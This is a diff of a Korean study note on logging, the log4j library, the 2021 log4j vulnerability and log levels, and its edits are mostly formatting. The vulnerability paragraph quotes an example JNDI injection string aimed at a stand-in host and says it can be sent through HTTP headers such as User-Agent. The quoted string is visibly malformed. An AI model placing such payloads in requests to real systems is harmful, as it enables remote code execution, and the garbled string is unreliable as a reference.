@@ -1,8 +1,8 @@
 **⏩ 개념**
 
-> 로그(Log)란 프로그램 개발이나 운영 시 발생하는 문제점을 추적하거나 운영 상태를 모니터링하기 위한 텍스트이다.
-> 
-<br>
+> 로그(Log)란 프로그램 개발이나 운영 시 발생하는 문제점을 추적하거나 운영 상태를 모니터링하기 위한 텍스트이다. <br>
+
+
 **⏩ log4j**
 
 보통 log4j 라이브러리를 활용하여 로그를 저장한다.
@@ -11,7 +11,7 @@ log4j란 Java 기반의 로깅 유틸리티로, Apache에서 만든 오픈소스
 
 Log for Java라는 뜻으로 Jakarta-project에서 Java를 위한 프로젝트 중 하나로 처음부터 Java의 예외를 처리하기 위해 설계되었다.
 
-프로그램 실행 시 자동으로 지정한 경로에 로그를 저장해주는 기능을 한다.
+프로그램 실행 시 자동으로 지정한 경로에 로그를 저장해주는 기능을 한다. <br>
 
 ***+) log4j 취약점 ::  2021년 12월***
 
@@ -25,8 +25,9 @@ Java 프로그램들은 앞서 말한 JNDI와 LDAP를 통해 Java 객체를 찾�
 
 이런 문법은 **로그가 기록될 때도 사용이 가능**했고, 결국 해커가 **로그에 기록되는 곳을 찾아 ${jndi:sndi:snd://example.com/a}과 같은 값을 추가**하기만 하면 **취약점을 이용**할 수 있는 것이다. 이 값을 넣는 방법은 **User-Agent와 같은 일반적인 HTTP 헤더**일 수도 있고 여러가지 방법이 있다.
 
-즉, 로그가 기록되는 곳을 찾아 값을 추가하면 외부 리소스를 다운받을 주소가 공격자의 서버가 되기 때문에 아주 손쉽게 !! 악성코드가 침투하는 것이다.
-<br>
+즉, 로그가 기록되는 곳을 찾아 값을 추가하면 외부 리소스를 다운받을 주소가 공격자의 서버가 되기 때문에 아주 손쉽게 !! 악성코드가 침투하는 것이다. <br>
+
+
 **⏩ logging level**
 
 - **FATAL**
@@ -59,8 +60,9 @@ Java 프로그램들은 앞서 말한 JNDI와 LDAP를 통해 Java 객체를 찾�
     개발자가 기록할 가치가 있는 정보를 남기기 위해 사용하는 레벨의 로그이다.
     
 
-DEBUG > INFO > WARN > ERROR > FATAL 순으로 로그가 찍힌다.
-<br>
+DEBUG > INFO > WARN > ERROR > FATAL 순으로 로그가 찍힌다. <br>
+
+
 **⏩ 참고**
 
 [https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&blogId=2zino&logNo=221641662104](https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&blogId=2zino&logNo=221641662104)
